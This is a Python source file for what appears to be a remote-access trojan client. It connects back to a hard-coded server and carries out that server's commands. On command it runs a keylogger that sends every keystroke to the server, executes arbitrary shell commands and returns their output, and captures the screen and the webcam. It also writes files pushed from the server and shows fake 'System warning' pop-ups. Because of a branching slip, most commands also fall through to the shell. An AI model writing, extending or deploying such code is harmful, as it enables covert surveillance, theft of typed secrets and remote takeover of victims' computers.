import socket
import webbrowser as wb
import os
import subprocess
import time   # 🔥 add
from plyer import notification
import pyttsx3
import cv2
import pyautogui
from pynput.keyboard import Listener
HOST = '192.168.0.141'
PORT = 5000

def speak(audio):
    engine = pyttsx3.init("sapi5")
    engine.setProperty("rate",170)
    engine.setProperty("volume",1.0)
    engine.stop()
    engine.say(audio)
    engine.runAndWait()

# 🔥 reconnect loop
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        break
    except:
        print("Server not available, retrying...")
        time.sleep(2)

print("Connected to server!")

def send_to_server(msg):
    client.send(msg.encode())

while True:
    try:
        data = client.recv(1024).decode()
    except:
        print("Server disconnected. Reconnecting...")
        client.close()
        time.sleep(2)

        # 🔥 reconnect again
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((HOST, PORT))
                print("Reconnected!")
                break
            except:
                time.sleep(2)
        continue

    if not data:
        continue

    print(f"Server: {data}")

    if data.startswith("open "):
        try:

            app = data.replace("open ", "").strip()
            #os.system("Taskkill /IM chrome.exe /F")
            #os.system("Taskkill /IM msedge.exe /F")
            #os.system("Taskkill /IM firefox.exe /F")
            wb.open(f"https://{app}.com")        

            send_to_server(f"{app} opened")   # 🔥 add this
        except:
            send_to_server("wrong domain name")

    elif data.lower() == "exit":
        break

    elif data.startswith("speak "):
        try:
            audio = data.replace("speak ", "").strip()
            speak(audio)
            send_to_server("voice speaked")   # 🔥 add this
        except:
            send_to_server("can't speak voice")
    
    elif data.lower() == "key_log":
        def on_press(key):
                try:
                    send_to_server(f"{key.char}")
                except AttributeError:
                    send_to_server(f"[{key}]")
        
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            send_to_server("Key Logger System Deactivated")
        
        

    elif data.startswith("show alert"):
        try:
            alert = data.replace("show alert ", "").strip()
            notification.notify(
                title="System warning",
                message=f"{alert}",
                timeout = 5
            )
            send_to_server(f"alert showed")   # 🔥 add this
        except:
            send_to_server("can't show the alert")
        
    elif data.lower() == "cap_screen":
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save("shot.png")

            send_to_server("Screenshot saved as shot.png")
        
        except:
            send_to_server("Error While Capturing Screen Shot")
        
    elif data.lower() == "cap_web":
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            time.sleep(2)
            ret, frame = cam.read()
            if ret:
                cv2.imwrite("selfie.png", frame)
                send_to_server("Selfie saved as selfie.png")
            else:
                send_to_server("Failed to capture selfie")
            cam.release()
        
        except:
            send_to_server("Failed to capture selfie")


    
    elif data.lower() == "all open":
        apps = [
            "excel","winword","powerpnt","outlook",
            "chrome","firefox","msedge",
            "cmd","powershell","ms-settings:",
            "explorer","notepad","calc","mspaint",
            "vlc","spotify"
        ]

        for app in apps:
            try:
                subprocess.Popen(f"start {app}", shell=True)
                send_to_server(f"{app} opened")
            except:
                send_to_server(f"{app} not found")
    
    if data.startswith("FILE "):
        try:
            parts = data.split()
            filename = parts[1]
            filesize = int(parts[2])

            print(f"Receiving file: {filename}")

            with open(filename, "wb") as f:
                received = 0
                while received < filesize:
                    chunk = client.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)

            send_to_server(f"{filename} received successfully")

        except Exception as e:
            send_to_server("file receive failed")

    else:
        try:
            data = subprocess.check_output(f"{data}", shell=True).decode()
            send_to_server(data)
            send_to_server("task complete")
        except:
           send_to_server(f"{data} command is wrong please give right command")
    
client.close()